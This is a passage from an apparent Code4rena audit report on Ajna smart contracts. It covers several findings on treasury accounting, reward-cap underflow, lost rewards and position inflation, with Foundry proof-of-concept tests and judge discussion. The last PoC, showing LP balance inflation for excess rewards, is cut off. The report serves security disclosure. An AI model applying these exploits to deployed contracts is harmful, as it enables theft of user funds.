209:            Proposal memory proposal = _standardFundingProposals[fundingProposalIds[i]];
210:
211:            totalTokensRequested += proposal.tokensRequested;
212:
213:            unchecked { ++i; }
214:        }
215:
216:        // readd non distributed tokens to the treasury
217:        treasury += (fundsAvailable - totalTokensRequested);
```

In the code block above, `fundsAvailable` represents 100% of the GBC and `totalTokensRequested` represents up to 90% of the GBC. As a result, the treasury always adds 10% of the reserve back to its accounting.

### Proof of Concept

The following PoC code is quite long because it must go through all stages. Please append and run this function in the file `ajna-grants/test/unit/StandardFunding.t.sol`. The test should pass without errors.

```solidity
File: ajna-grants/test/unit/StandardFunding.t.sol
    /*
        1. startDistributionPeriod
        2. proposeStandard
        3. screeningVote
        4. fundingVote
        5. updateSlate
        6. executeStandard
        7. claimDelegateReward
    */
        function testPoCTreasuryPrecisionLoss() public {
        // 14 tokenholders self delegate their tokens to enable voting on the proposals
        _selfDelegateVoters(_token, _votersArr);
        uint allVotersInitBalance = 50_000_000 * 1e18;
        emit log_named_uint("Treasury initial amount", _grantFund.treasury());

        vm.roll(_startBlock + 150);

        /* =========================
        1. startDistributionPeriod()
        ========================= */
        assertEq(_token.balanceOf(address(_grantFund)), 500_000_000 * 1e18, "No token should have left the treasury");
        uint24 distributionId = _grantFund.startNewDistributionPeriod();
        assertEq(_grantFund.getDistributionId(), distributionId, "Should have the same ID");
        uint oldTreasury = _grantFund.treasury();
        emit log_named_uint("Treasury after start, deduct 3%", oldTreasury);

        (, , , uint128 gbc, , ) = _grantFund.getDistributionPeriodInfo(distributionId);
        assertEq(gbc, 15_000_000 * 1e18);
        emit log_named_uint("GBC", uint(gbc));
        assertEq(oldTreasury + gbc, 500_000_000 * 1e18, "Should be equal to the initial treasury fund");

        /* =================
        2. proposeStandard()
        ================= */
        // Request 9/10 of GBC (maximal)
        // 9/10 of GBC = 13_500_000 == 8_500_000 + 5_000_000 (all in WAD uint)
        TestProposalParams[] memory testProposalParams = new TestProposalParams[](2);
        testProposalParams[0] = TestProposalParams(address(this), 8_500_000 * 1e18);
        testProposalParams[1] = TestProposalParams(address(this), 5_000_000 * 1e18);
        TestProposal[] memory testProposals = _createNProposals(_grantFund, _token, testProposalParams);
        assertEq(testProposals.length, 2, "Should created exact 2 proposals");
        vm.roll(_startBlock + 200);

        /* ===============
        3. screeningVote()
        =============== */
        // Demonstrate only 6 voters, all fully use their vote power (50_000_000 * 1e18)
        // #0 got 2 votes
        // #1 got 4 votes
        _screeningVote(_grantFund, _tokenHolder1, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder1));
        _screeningVote(_grantFund, _tokenHolder2, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder2));
        _screeningVote(_grantFund, _tokenHolder3, testProposals[1].proposalId, _getScreeningVotes(_grantFund, _tokenHolder3));
        _screeningVote(_grantFund, _tokenHolder4, testProposals[1].proposalId, _getScreeningVotes(_grantFund, _tokenHolder4));
        _screeningVote(_grantFund, _tokenHolder5, testProposals[1].proposalId, _getScreeningVotes(_grantFund, _tokenHolder5));
        _screeningVote(_grantFund, _tokenHolder6, testProposals[1].proposalId, _getScreeningVotes(_grantFund, _tokenHolder6));

        // /* =============
        // 4. fundingVote()
        // ============= */
        // skip time to move from screening period to funding period
        vm.roll(_startBlock + 600_000);

        GrantFund.Proposal[] memory proposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getTopTenProposals(distributionId));
        assertEq(proposals.length, 2);

        // Proposals should be sorted descending according to votes received so #1 should be the first and #0 should be the second
        assertEq(proposals[0].proposalId, testProposals[1].proposalId, "Should have the correct proposalId #1");
        assertEq(proposals[0].votesReceived, 200_000_000 * 1e18, "Should have the voting score of 4 voters");
        assertEq(proposals[1].proposalId, testProposals[0].proposalId, "Should have the correct proposalId #0");
        assertEq(proposals[1].votesReceived, 100_000_000 * 1e18, "Should have the voting score of 2 voters");

        // funding period votes for two competing slates, 1, or 2 and 3
        // #1 got 3 funding votes
        // #0 got 3 funding votes
        _fundingVote(_grantFund, _tokenHolder1, proposals[0].proposalId, voteYes, 50_000_000 * 1e18);
        _fundingVote(_grantFund, _tokenHolder2, proposals[1].proposalId, voteYes, 50_000_000 * 1e18);
        _fundingVote(_grantFund, _tokenHolder3, proposals[1].proposalId, voteYes, 50_000_000 * 1e18);
        _fundingVote(_grantFund, _tokenHolder4, proposals[1].proposalId, voteYes, 50_000_000 * 1e18);
        _fundingVote(_grantFund, _tokenHolder5, proposals[0].proposalId, voteYes, 50_000_000 * 1e18);
        _fundingVote(_grantFund, _tokenHolder6, proposals[0].proposalId, voteYes, 50_000_000 * 1e18);

        // Ensure that all 6 holders have fully voted.
        for (uint i = 0; i < 6; i++) {
            (uint128 voterPower, uint128 votingPowerRemaining, uint256 votesCast) = _grantFund.getVoterInfo(distributionId, _votersArr[i]);
            assertEq(voterPower, 2_500_000_000_000_000 * 1e18, "Should have 50m^2 voting power");
            assertEq(votingPowerRemaining, 0, "Should have fully voted");
        }

        // /* =============
        // 5. updateSlate()
        // ============= */
        // skip to the end of the DistributionPeriod
        vm.roll(_startBlock + 650_000);

        // Updating potential Proposal Slate to include proposal that is in topTenProposal (funding Stage)
        uint256[] memory slate = new uint256[](proposals.length); // length = 2
        slate[0] = proposals[0].proposalId;
        slate[1] = proposals[1].proposalId;
        require(_grantFund.updateSlate(slate, distributionId), "Should update slate success");
        (, , , , , bytes32 slateHash) = _grantFund.getDistributionPeriodInfo(distributionId);
        assertTrue(slateHash != bytes32(0));
        proposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getFundedProposalSlate(slateHash));

        // /* =================
        // 6. executeStandard()
        // ================= */
        // skip to the end of the Distribution's challenge period
        vm.roll(_startBlock + 700_000);

        // execute funded proposals
        assertEq(_token.balanceOf(address(this)), 0, "This contract should have 0 token amount");
        _grantFund.executeStandard(testProposals[0].targets, testProposals[0].values, testProposals[0].calldatas, keccak256(bytes(testProposals[0].description)));
        _grantFund.executeStandard(testProposals[1].targets, testProposals[1].values, testProposals[1].calldatas, keccak256(bytes(testProposals[1].description)));
        
        assertEq(testProposals[0].tokensRequested + testProposals[1].tokensRequested, _token.balanceOf(address(this)), "The contract should received correct granted amount");
        emit log_named_uint("totalTokensRequested", _token.balanceOf(address(this)));
        assertEq(_token.balanceOf(address(this)), gbc * 9/10, "Should be equal to 90% of GBC");
        
        proposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getFundedProposalSlate(slateHash));
        assertTrue(proposals[0].executed && proposals[1].executed, "Should have successfully executed");

        // /* =================
        // 7. claimDelegateReward()
        // ================= */
        // Claim delegate reward for all delegatees
        // delegates who didn't vote with their full power receive fewer rewards
        uint totalDelegationRewards;
        for (uint i = 0; i < _votersArr.length; i++) {
            uint estimatedRewards = _grantFund.getDelegateReward(distributionId, _votersArr[i]);
            changePrank(_votersArr[i]);
            if (i > 5) {
                // these are holders who haven't participated in this period, should have 0 reward
                // _tokenHolder7 and above
                vm.expectRevert(IStandardFunding.DelegateRewardInvalid.selector);
                uint actualRewards = _grantFund.claimDelegateReward(distributionId);
                assertTrue(estimatedRewards == 0 && actualRewards == 0, "Should be ineligible for rewards");
                assertFalse(_grantFund.hasClaimedReward(distributionId, _votersArr[i]), "Should unable to claim");
                assertEq(_token.balanceOf(_votersArr[i]), allVotersInitBalance, "Balance should be the same as starting");
            }
            else {
                // these are holders who have voted
                // _tokenHolder1 - 6
                uint actualRewards = _grantFund.claimDelegateReward(distributionId);
                assertEq(estimatedRewards, actualRewards, "Should received the exact reward amount");
                assertTrue(estimatedRewards != 0 && actualRewards != 0, "Should be eligible for rewards");
                assertTrue(_grantFund.hasClaimedReward(distributionId, _votersArr[i]), "Should claim successfully");

                assertEq(_token.balanceOf(_votersArr[i]), allVotersInitBalance + actualRewards, "Should have the final balance equal to init+reward");
                totalDelegationRewards += actualRewards;
            }
        }

        emit log_named_uint("Total claimed rewards", totalDelegationRewards);
        assertEq(totalDelegationRewards, gbc / 10, "Should be equal to 10% of GBC");
        assertEq(totalDelegationRewards + _token.balanceOf(address(this)), gbc, "10% + 90% = 100%");
        assertEq(totalDelegationRewards + _token.balanceOf(address(this)) + oldTreasury, 500_000_000 * 1e18, "10% + 90% + remaining = initial treasury");
        emit log_named_uint("Treasury at the end of the period (should be the same as started)", _grantFund.treasury());

        // Put the treasury back to the same value as the last period to have the same GBC for easier to compare.
        // Remember this equation? "10% + 90% + remaining = initial treasury"
        // Current _grantFund.treasury() = remaining.
        // _token.balanceOf(address(this)) = 90%
        // _grantFund.startNewDistributionPeriod() -> _grantFund._updateTreasury() = 10% (because of the invalid logic)
        changePrank(address(this));
        _token.approve(address(_grantFund), _token.balanceOf(address(this)));

        // only put 90% back to the treasury
        _grantFund.fundTreasury(_token.balanceOf(address(this)));

        // 10% + (90%&remaining) = initial treasury
        assertEq(totalDelegationRewards + _grantFund.treasury(), 500_000_000 * 1e18, "Should be equal to the initial treasury");

        // The function put 10% back in, while in the actual all 100% has been spent. Loss 10%.
        _grantFund.startNewDistributionPeriod();
        emit log_named_uint("Treasury at the new period (got updated)", _grantFund.treasury());
        assertEq(_token.balanceOf(address(_grantFund)), 498_500_000 * 1e18, "Should be initial-10%");
        emit log_named_uint("treasury actual balance", _token.balanceOf(address(_grantFund)));

        // The same GBC evidenced that treasury = 500_000_000 * 1e18 at the time it was calculated,
        // But the actual balance is 500_000_000 * 1e18 - 10% = 498_500_000 * 1e18.
        (, , , uint128 newGbc, , ) = _grantFund.getDistributionPeriodInfo(distributionId);
        assertEq(oldTreasury + gbc, _grantFund.treasury() + gbc, "Should have the same GBC as previous period");
        assertEq(gbc, newGbc, "Should have the same GBC as previous period");
    }
```

```shell
run: forge test --match-test testPoCTreasuryPrecisionLoss -vv

Running 1 test for test/unit/StandardFunding.t.sol:StandardFundingGrantFundTest
[PASS] testPoCTreasuryPrecisionLoss() (gas: 3451937)
Logs:
  Treasury initial amount: 500000000000000000000000000
  Treasury after start, deduct 3%: 485000000000000000000000000
  GBC: 15000000000000000000000000
  totalTokensRequested: 13500000000000000000000000
  Total claimed rewards: 1500000000000000000000000
  Treasury at the end of the period (should be the same as started): 485000000000000000000000000
  Treasury at the new period (got updated): 485000000000000000000000000
  treasury actual balance: 498500000000000000000000000

Test result: ok. 1 passed; 0 failed; finished in 1.20s
```

### Tools Used

*   Manual review
*   Foundry

### Recommended Mitigation Steps

If it is safe to assume that all periods will always have 10% for delegation rewards, the contract should calculate only 90% of `fundsAvailable` when updating the treasury.

```diff
File: ajna-grants/src/grants/base/StandardFunding.sol

197:    function _updateTreasury(
198:        uint24 distributionId_
199:    ) private {
200:        bytes32 fundedSlateHash = _distributions[distributionId_].fundedSlateHash;
201:        uint256 fundsAvailable  = _distributions[distributionId_].fundsAvailable;

            ...

216:        // readd non distributed tokens to the treasury
+217:        treasury += ((fundsAvailable * 9/10) - totalTokensRequested);      

```

### Remark

The `claimDelegateReward()` function uses `Maths.wmul()`, which automatically rounds the multiplication result up or down. For example, `Maths.wmul(1, 0.5 * 1e18) = 1` (rounding up) while `Maths.wmul(1, 0.49 * 1e18) = 0` (rounding down). As a result, `rewardClaimed_` can lose precision for small decimal amounts and token holders typically have small fractions of tokens down to `1 wei`. It is uncertain, but the total actual paid rewards could be more than 10% if rounded up, resulting in an insignificant loss of precision in the treasury. However, if `rewardClaimed_` is deducted from `fundsAvailable`, it could lead to an integer underflow revert if `fundsAvailable - totalClaimed - totalTokensRequested = 100% - 10.xx% - 90%`, which exceeds 100%.

**[Picodes (judge) increased severity to High](https://github.com/code-423n4/2023-05-ajna-findings/issues/450#issuecomment-1568861837)**

**[MikeHathaway (Ajna) confirmed via duplicate issue `#263`](https://github.com/code-423n4/2023-05-ajna-findings/issues/263#issuecomment-1555119925)**



***

## [[H-05] Incorrect calculation of the remaining `updatedRewards` leads to possible underflow error](https://github.com/code-423n4/2023-05-ajna-findings/issues/440)
*Submitted by [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/440), also found by [Koolex](https://github.com/code-423n4/2023-05-ajna-findings/issues/354) and [Vagner](https://github.com/code-423n4/2023-05-ajna-findings/issues/192)*

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L549><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L725>

`RewardsManage.sol` keeps track of the **total number of rewards collected per epoch** for all pools:

```c
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol
73:    /// @dev `epoch => rewards claimed` mapping.
74:    mapping(uint256 => uint256) public override rewardsClaimed;
75:    /// @dev `epoch => update bucket rate rewards claimed` mapping.
76:    mapping(uint256 => uint256) public override updateRewardsClaimed;
```

And the `rewardsCap` calculation when calculating the reward applies only to the pool, which leads to a situation when the condition is fulfilled `rewardsClaimedInEpoch + updatedRewards_ >= rewardsCap`, **But `rewardsCap` is less than `rewardsClaimedInEpoch`**:

```diff
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol

-543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);
545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.
-546:         if (rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) {
548:             // set claim reward to difference between cap and reward
-549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit rewardsCapped can be less then  rewardsClaimedInEpoch_
550:         }

719:         uint256 rewardsCap            = Maths.wmul(UPDATE_CAP, totalBurned); // @audit in one pool
-720:        uint256 rewardsClaimedInEpoch = updateRewardsClaimed[curBurnEpoch];
722:         // update total tokens claimed for updating bucket exchange rates tracker
723:         if (rewardsClaimedInEpoch + updatedRewards_ >= rewardsCap) {
724:              // if update reward is greater than cap, set to remaining difference
-725:             updatedRewards_ = rewardsCap - rewardsClaimedInEpoch; // @audit rewardsCap can be less then rewardsClaimedInEpoch
726:         }
728:         // accumulate the full amount of additional rewards
-729:        updateRewardsClaimed[curBurnEpoch] += updatedRewards_; // @audit increase per epoch
```

Which causes an `underflow` erorr in the result `updatedRewards_ = rewardsCap - rewardsClaimedInEpoch` where `rewardsCap < rewardsClaimedInEpoch`, this error **leads to a transaction fail**, which will further temporarily/permanently block actions with NFT as `unstake/claimRewards` for pools in which `rewardsCap` will fail less than the total `rewardsClaimedInEpoch`.

We have 2 instances of this problem::

1.  during the call `_calculateNewRewards`
2.  during the call `_updateBucketExchangeRates`

A failure in any of these will result in users of certain pools being unable to withdraw their NFTs as well as the reward.

### Proof of Concept

Let's take a closer look at the problem and why this is possible:

1.  We have a general calculation of rewards taken per epoch:

```javascript
File: ajna-core\src\RewardsManager.sol

71:     /// @dev `epoch => rewards claimed` mapping.
72:     mapping(uint256 => uint256) public override rewardsClaimed;
73:     /// @dev `epoch => update bucket rate rewards claimed` mapping.
74:     mapping(uint256 => uint256) public override updateRewardsClaimed;
```

2.  The state is updated for the epoch by the amount calculated for each pool:

```javascript
File: ajna-core\src\RewardsManager.sol

_calculateAndClaimRewards
396:         for (uint256 epoch = lastClaimedEpoch; epoch < epochToClaim_; ) {

410:             // update epoch token claim trackers
411:             rewardsClaimed[epoch]           += nextEpochRewards;

413:         }

_updateBucketExchangeRates
676:         uint256 curBurnEpoch = IPool(pool_).currentBurnEpoch();

728:                 // accumulate the full amount of additional rewards
729:                 updateRewardsClaimed[curBurnEpoch] += updatedRewards_;
```

3.  At the time of calculation of the reward for the update:

```diff
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol

526:         (
527:             ,
528:             // total interest accumulated by the pool over the claim period
+529:             uint256 totalBurnedInPeriod,
530:             // total tokens burned over the claim period
531:             uint256 totalInterestEarnedInPeriod
532:         ) = _getPoolAccumulators(ajnaPool_, nextEpoch_, epoch_);
533:
534:         // calculate rewards earned
                ...
542:
+543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);
544:
545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.
546:         if (rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) {
547:
548:             // set claim reward to difference between cap and reward
+549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit
550:         }
```

We have a situation where `rewardsClaimedInEpoch_` has been updated by other pools to something like `100e18`,
and `rewardsCapped` for the other pool was `30e18`, resulting in:<br>
`  rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped `<br>
and of course we catch the underflow at the time of calculating the remainder, `30e18 - 100e18`, since there is no remainder
`newRewards_ = rewardsCapped - rewardsClaimedInEpoch_`.

To check the problem, you need to raise `rewardsClaimedInEpoch_` more than the `rewardsCap` of a certain pool, with the help of other pools, `rewardsCap` is a percentage of burned tokens in the pool... so it's possible.

### Tools Used

*   Manual review
*   Foundry

### Recommended Mitigation Steps

*   Add additional requirements that if `rewardsClaimedInEpoch > rewardsCap` that `updatedRewards_` should be zero, not need calculate remaining difference.

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1555156243)**

**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1569154687):**
 > Giving Medium severity for "Assets not at direct risk, but the function of the protocol or its availability could be impacted"

**[Haipls (warden) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1573707899):**
 > Hi @Picodes - I would like to ask you to reconsider the severity of the issue. You've classified it as `Med` - `Assets not at direct risk, but the function of the protocol or its availability could be impacted`.
> 
> Upon review, in my opinion, this issue leans more towards HIGH - `Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals)`. 
> 
> Below, I will attempt to present my reasoning and why I think this way:
> 
> I've considered `2` metrics to determine severity:
> 
> 1. Consequences
> 2. The likelihood of it happening
> 
> And came up with the following results:
> 
> 1. Consequences
>    
>     The consequence of this issue is that in the event of it happening, NFTs are blocked on the RewardsManager.sol contract with no possibility of their further withdrawal. This is critical and falls under: `Assets can be stolen/lost/compromised directly`. Moreover, these are not just NFTs, they are LP positions.
>     
>     When this problem occurs, the ability for `stake/unstake/claimRewards` of the affected pools is closed due to a mathematical error, leading to a simple blockage of interaction with these pools. As it becomes impossible to process the reward update for a given epoch. For pools that weren't affected and managed to process before, they will be able to operate further until the situation repeats.
> 
> 2. The main point in deciding whether it's `Medium/High` is how likely this problem is to occur. 
>    
>     Here I looked at the dependence in calculations on the number of pools
>     ```c
>       uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod);
> 
>         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed.
>         if (rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) {
> 
>             // set claim reward to difference between cap and reward
>             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; 
>         }
>     ```
> 
>     `rewardsClaimedInEpoch_` is a value that sums up across all pools
> 
>     `rewardsCapped` is a value related to the calculation of a single pool and depends on the number of coins burned in the epoch in the selected pool
> 
>     And there arises a situation when `n1 - (n2 + n3...+ nn)` by pools. In reality, it's all more complex and depends on the number of burned coins in the pools, but the essence is that the more pools we have, the higher the chances that this condition simply reverts. And this is no longer an unlikely situation.
> 
> **Also an example of a highly probable situation:**
> 
> When there's a HUGE pool and several small ones in the middle. It's enough for only the HUGE pool to update the epoch's reward. This will cause a problem with the condition's execution for all other small pools
> 
> 
> This can also be a vector of an attacker who purposely burns an extra amount of coins to increase the reward update on the pool. And causes positions blocking in the contract.
> 
> After these considerations, I would like you to reconsider the severity of the problem, as we have two points:
> 
> 1. Direct blocking of funds on the contract.
> 2. The situation is not theoretical.
> 
> I hope my thoughts will be useful. I understand that I can be wrong and I hope you can clarify if I am not understanding something correctly. Thank you.

**[Picodes (judge) increased severity to High and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/440#issuecomment-1574940585):**
 > Hi @Haipls - thanks for your comment. Upon review, I agree with your take and will upgrade to High.



***

## [[H-06] The lender could possibly lose unclaimed rewards in case a bucket goes bankrupt](https://github.com/code-423n4/2023-05-ajna-findings/issues/329)
*Submitted by [Koolex](https://github.com/code-423n4/2023-05-ajna-findings/issues/329)*

When the lender calls `PositionManager.memorializePositions` method the following happens:

1.  Records bucket indexes along with its deposit times and lpBalances
2.  Transfers LP ownership from the lender to PositionManager contract.

In point 1, it checks if there is a previous deposit and the bucket went bankrupt after prior memorialization, then it zero out the previous tracked LP. However, the lender could still have unclaimed rewards. In this case, the lender loses the rewards due to the lack of claiming rewards before zeroing out the previous tracked LP balance. If you check claim rewards functionality in RewardsManager, the bucket being not bankrupt is not a requirement. Please note that claiming rewards relies on the tracked LP balance in PositionManager.

### Proof of Concept

*   `PositionManager.memorializePositions` method
    *   check for previous deposits and zero out the previous tracked LP if bucket is bankrupt
    ```
    	// check for previous deposits
    	if (position.depositTime != 0) {
    		// check that bucket didn't go bankrupt after prior memorialization
    		if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {
    			// if bucket did go bankrupt, zero out the LP tracked by position manager
    			position.lps = 0;
    		}
    	}

    ```
    <https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L192-L199>

*   In RewardsManager, check `claimRewards` and `_claimRewards`  method. there is no a check for bucket's bankruptcy.

    <https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L114>

    <https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L561>

### Recommended Mitigation Steps

On memorializePositions, check if the lender already claimed his/her rewards before zeroing out the previous tracked LP.

**[ith-harvey (Ajna) disputed](https://github.com/code-423n4/2023-05-ajna-findings/issues/329#issuecomment-1608467083)**

**[grandizzy (Ajna) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/329#issuecomment-1609466700):**
> That is by design and we acknowledge that documentation of bucket bankruptcy can be improved. When a bucket goes bankrupt (which shouldn't happen often but only when there's bad debt in pool to settle) the lender won't lose only their rewards but will also lose all the shares in that bucket / LP (which has higher impact than rewards).<br>
> Also the recommendation of:<br>
> `On memorializePositions, check if the lender already claimed his/her rewards before zeroing out the previous tracked LP.`
> 
> Would imply making position manager contract aware of rewards manager contract and we don't want to couple those 2 in reference implementation. However, additional position and rewards manager could be developed by 3rd parties and could take into consideration this recommendation.



***

## [[H-07] User can exponentially increase the value of their position through the `memorializePositions` function](https://github.com/code-423n4/2023-05-ajna-findings/issues/256)
*Submitted by [BPZ](https://github.com/code-423n4/2023-05-ajna-findings/issues/256), also found by [sces60107](https://github.com/code-423n4/2023-05-ajna-findings/issues/304), [xuwinnie](https://github.com/code-423n4/2023-05-ajna-findings/issues/234), [Koolex](https://github.com/code-423n4/2023-05-ajna-findings/issues/223), [ast3ros](https://github.com/code-423n4/2023-05-ajna-findings/issues/217), [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/193), and [SpicyMeatball](https://github.com/code-423n4/2023-05-ajna-findings/issues/108)*

The [PositionManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42) allows a lender to mint an NFT that will be representative of their lp positions. This is done by [minting](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L227) an NFT and then invoking the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) which will assign their lp positions to the respective NFT. However, while the memorializePositions function will update the lp balances based on the [entirety](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L188) of the lender's lp balance for a given index bucket within the pool, the [Pool contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L74) will update the lender's balance based on the [minimum value](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#LL244C70-L244C70) between the allowed amount and the lender's balance. This means that, if a user specifies an allowance for the PositionManager contract by calling the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) that is less than their total balance for a respective position before invoking the memorializePositions function, their position's lp balance tracked by the [PositionManager's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increase by the entirety of their balance while their position that is tracked by the [Pool's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrease by the specified allowance. The impact of this is that a lender can exponentially increase the value of their position by repeating the steps of specifying a minimum allowance for the PositionManager for their positions and then invoking memorializePositions until their lp position that is tracked by the Pool's state is 0. The lender can then [stake](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L207) this exponentially overvalued position through the [RewardsManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L35) allowing them to receive substantially more rewards for their position then should be allotted. The direct implications of this are that the user will be rewarded a substantial amount of AJNA reward tokens which are directly redeemable for the Pool's quote tokens through its Redeemable Reserve and, additionally, over-value the user's influence on the protocol's proposal funding because a user's votes are weighted by the amount of AJNA tokens they hold. We believe this to be a high severity vulnerability because it directly affects user funds and the functionality of the protocol in general.

### Proof of Concept

The described vulnerability occurs when a lender specifies allowances for the PositionManager contract that are less than their lp balance for each respective index through the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) and then invokes the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170). The result of this is that the user's lp balance tracked by the [PositionManager's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increment by the position's balance while the lp balance tracked by the [Pool's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrement by the specified allowance. A user can repeat this process through multiple iterations until their respective lp balances with the Pool contract are 0 which will exponentially increase the value of their position.    Please see the following test case for a POC simulating the effect of this described vulnerability on a user's position:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import "forge-std/console.sol";

import {Base64} from "@base64-sol/base64.sol";

import "tests/forge/unit/PositionManager.t.sol";

/**
 *  @title  Proof of Concept
 *  @notice Simulates the effect of the described vulnerability where a user
 *          can exponentially increase the value of their position by:
 *          1- only approving the `PositionManager` for a min amount of their position
 *          2- invoking 'memorializePositions' on their position's respective NFT
 *          3- repeating these steps until their respective position's Pool lp balance is 0
 *  @dev    This test case can be implemented and run from the ajna-core/tests/forge directory
 */
contract POC is PositionManagerERC20PoolHelperContract {
    function testMemorializePositionsWithMinApproval() external {
        uint256 intialLPBalance;
        uint256 finalLPBalance;

        address testsAddress = makeAddr("testsAddress");
        uint256 mintAmount = 10000 * 1e18;

        _mintQuoteAndApproveManagerTokens(testsAddress, mintAmount);

        // Call pool contract directly to add quote tokens
        uint256[] memory indexes = new uint256[](3);
        indexes[0] = 2550;
        indexes[1] = 2551;
        indexes[2] = 2552;

        _addInitialLiquidity({
            from: testsAddress,
            amount: 3_000 * 1e18,
            index: indexes[0]
        });
        _addInitialLiquidity({
            from: testsAddress,
            amount: 3_000 * 1e18,
            index: indexes[1]
        });
        _addInitialLiquidity({
            from: testsAddress,
            amount: 3_000 * 1e18,
            index: indexes[2]
        });

        // Mint an NFT to later memorialize existing positions into.
        uint256 tokenId = _mintNFT(testsAddress, testsAddress, address(_pool));

        // Pool lp balances before.
        (uint256 poolLPBalanceIndex1, ) = _pool.lenderInfo(
            indexes[0],
            testsAddress
        );
        (uint256 poolLPBalanceIndex2, ) = _pool.lenderInfo(
            indexes[1],
            testsAddress
        );
        (uint256 poolLPBalanceIndex3, ) = _pool.lenderInfo(
            indexes[2],
            testsAddress
        );

        console.log("\n Pool lp balances before:");
        console.log("bucket %s: %s", indexes[0], poolLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], poolLPBalanceIndex2);
        console.log("bucket %s: %s", indexes[2], poolLPBalanceIndex3);

        intialLPBalance =
            poolLPBalanceIndex1 +
            poolLPBalanceIndex2 +
            poolLPBalanceIndex3;

        // PositionManager lp balances before.
        (uint256 managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[0]
        );
        (uint256 managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[1]
        );
        (uint256 managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(
            tokenId,
            indexes[2]
        );

        console.log("\n PositionManger lp balances before:");
        console.log("bucket %s: %s", indexes[0], managerLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[1], managerLPBalanceIndex1);
        console.log("bucket %s: %s", indexes[2], managerLPBalanceIndex1);

        console.log(
            "\n <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->"
        );

        // Approve the PositionManager for only 1 token in each bucket.
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1 * 1e18;
        amounts[1] = 1 * 1e18;
        amounts[2] = 1 * 1e18;
